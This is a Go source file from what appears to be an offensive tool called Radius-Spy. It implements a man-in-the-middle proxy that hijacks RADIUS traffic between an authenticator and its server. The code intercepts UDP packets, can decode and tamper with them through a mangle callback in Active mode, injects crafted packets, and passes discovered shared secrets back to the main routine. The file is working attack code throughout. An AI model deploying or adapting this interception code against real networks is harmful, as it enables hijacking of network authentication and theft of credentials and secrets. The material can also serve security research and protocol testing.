package session

import (
	"net"
	"os"
	"strconv"

	"github.com/famez/Radius-Spy/radius"
	"github.com/famez/Radius-Spy/utils"

	"github.com/golang/glog"
)

type Mode uint

const (
	Passive Mode = 0
	Active  Mode = 1
)

//MangleFunc Callback that receives as argument the intercepted packetm, the client and server addresses and the sense of the packet (client -> server, server -> client)
type MangleFunc func(packet *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool

//This struct is used as payload for the secretChan channel used to transmit
//the pair secret-client from the goroutine to the main routine when the secret is discovered for such client
type secretClientPair struct {
	clientAddr net.UDPAddr
	secret     string
}

//Session between host and client to be hijacked.
//The attacker must be placed between the authenticator and the authenticator server.
//hostName is the target RADIUS authenticator server
type Session struct {
	hostName          string //Target RADIUS server
	ports             []int  //Target ports
	currentClientData *clientData
	currentServerConn *net.UDPConn
	secretChan        chan secretClientPair
	mode              Mode
}

type udpData struct {
	buff       []byte
	senderAddr net.UDPAddr
	dstPort    int
}

type clientData struct {
	clientAddr net.UDPAddr
	connection *net.UDPConn
	mappedPort int //Port in case that direct mapping is not possible (port already in use)
}

const protocol = "udp"

//Receives UDP packets and writes the result in a channel for asyncronous management of the packets
func receiveUDPPacket(conn *net.UDPConn, dstPort int, channel chan udpData) {

	buff := make([]byte, 2048)

	for {
		n, addr, err := conn.ReadFromUDP(buff)
		if n > 0 {
			res := make([]byte, n)
			// Copy the buffer so it doesn't get changed while read by the recipient.
			copy(res, buff[:n])

			udpData := udpData{
				buff:       res,
				senderAddr: *addr,
				dstPort:    dstPort,
			}

			channel <- udpData
		}
		if err != nil {
			close(channel)
			break
		}
	}

}

func setupUDPServer(port int) *net.UDPConn {

	addrToListen := ":" + strconv.FormatUint(uint64(port), 10)

	//Build the address
	localAddr, err := net.ResolveUDPAddr(protocol, addrToListen)

	if err != nil {
		glog.V(0).Infoln("Could not bind to the corresponding port:", port)
		os.Exit(-1)
	}

	clientConn, err := net.ListenUDP(protocol, localAddr)

	if err != nil {
		glog.V(0).Infoln("Error", err)
		os.Exit(-1)
	}

	return clientConn

}

func (session *Session) Init(mode Mode, hostName string, ports ...int) {

	session.mode = mode
	session.hostName = hostName

	session.ports = make([]int, len(ports))

	copy(session.ports, ports)

	//Initialize the TLS local server
	initLocalTLSServer()

}

//Hijack In order to spy the communications between authenticator and authenticator server
func (session *Session) Hijack(mangleFunc MangleFunc) {

	var clients []clientData

	session.secretChan = make(chan secretClientPair)

	udpChan := make(chan udpData)
	serverConnections := make(map[int]*net.UDPConn)

	for _, port := range session.ports {

		serverConn := setupUDPServer(port)
		serverConnections[port] = serverConn
		go receiveUDPPacket(serverConn, port, udpChan) //Start receiving packets from client towards the RADIUS server

	}

	for {

		select {
		//Packet received
		case data, more := <-udpChan:

			//Channel closed (Problems with one of the sides)
			if !more {
				glog.V(0).Infoln("Hijack: Something went wrong...")
				break
			}

			glog.V(3).Infoln("Message from", data.senderAddr, "to port:", data.dstPort)

			//Forward packet

			if data.senderAddr.IP.Equal(net.ParseIP(
				session.hostName)) && utils.Contains(session.ports, data.senderAddr.Port) { //Came from authenticator server RADIUS

				//Check if address already seen
				for _, client := range clients {
					if client.mappedPort == data.dstPort {

						if session.mode == Active {

							session.currentClientData = &client
							session.currentServerConn = serverConnections[data.senderAddr.Port]

							packet := radius.NewRadiusPacket()

							packet.Decode(data.buff)

							forward := mangleFunc(packet, data.senderAddr, client.clientAddr, false)

							if forward {

								if encoded, raw := packet.Encode(); encoded {
									glog.V(3).Infoln("Packet mangled and forwarded... ")
									//Redirect our custom mangled packet to the client
									serverConnections[data.senderAddr.Port].WriteToUDP(raw, &client.clientAddr)
								}

							}

						} else {
							//Redirect to client without any treatment
							serverConnections[data.senderAddr.Port].WriteToUDP(data.buff, &client.clientAddr)

						}

						break
					}
				}

			} else { //From authenticator

				found := false

				var client clientData

				//Check if address already seen
				for _, client = range clients {
					if client.clientAddr.IP.Equal(data.senderAddr.IP) && client.clientAddr.Port == data.senderAddr.Port {
						found = true
						break
					}
				}

				if !found {
					//Create client

					//Determine free port

					freePort := false
					mappedPort := data.senderAddr.Port //First we try with the sender's port

					for !freePort {
						freePort = true
						for _, client := range clients {
							if client.mappedPort == mappedPort {
								freePort = false
								mappedPort++ //Try next port
								break
							}
						}

					}

					localAddr := net.UDPAddr{
						//IP: net.IPv4(0, 0, 0, 0)
						Port: mappedPort,
					}

					authAddr, err := net.ResolveUDPAddr(protocol, session.hostName+":"+strconv.FormatUint(uint64(data.dstPort), 10))

					if err != nil {
						glog.V(3).Infoln("Error authAddr ", err)
						return
					}

					conn, err := net.DialUDP(protocol, &localAddr, authAddr)

					if err != nil {
						glog.V(3).Infoln("Error net.DialUDP ", err)
						return
					}

					client = clientData{
						clientAddr: data.senderAddr,
						connection: conn,
						mappedPort: mappedPort,
					}

					clients = append(clients, client)

					//Create new context for the new session. Available for the whole program.

					AddContext(client.clientAddr, *(client.connection.RemoteAddr().(*net.UDPAddr)))

					go receiveUDPPacket(client.connection, mappedPort, udpChan) //Start receiving packets from radius server

				}

				if session.mode == Active {

					session.currentClientData = &client
					session.currentServerConn = serverConnections[client.connection.RemoteAddr().(*net.UDPAddr).Port]

					packet := radius.NewRadiusPacket()

					packet.Decode(data.buff)

					forward := mangleFunc(packet, client.clientAddr, *(client.connection.RemoteAddr().(*net.UDPAddr)), true)

					if forward {

						if encoded, raw := packet.Encode(); encoded {
							glog.V(3).Infoln("Packet mangled and forwarded... ")
							client.connection.Write(raw) //Redirect mangled packet to server
						}

					}

				} else {
					//Redirect raw data without any treatment
					client.connection.Write(data.buff)
				}

			}

		}

	}

}

//SendPacket must be only called from manglePacket
func (session *Session) SendPacket(packet *radius.RadiusPacket, clientToServer bool) {

	if encoded, raw := packet.Encode(); encoded {

		if clientToServer {
			glog.V(3).Infoln("Send packet to server... ")
			num, err := session.currentClientData.connection.Write(raw) //Send packet to server

			if err != nil {
				glog.V(3).Infoln("Error:", err)
			} else {
				glog.V(3).Infoln("Bytes written:", num)
			}

		} else {
			session.currentServerConn.WriteToUDP(raw, &session.currentClientData.clientAddr)
			glog.V(3).Infoln("Send packet to client... ")
		}

	}

}
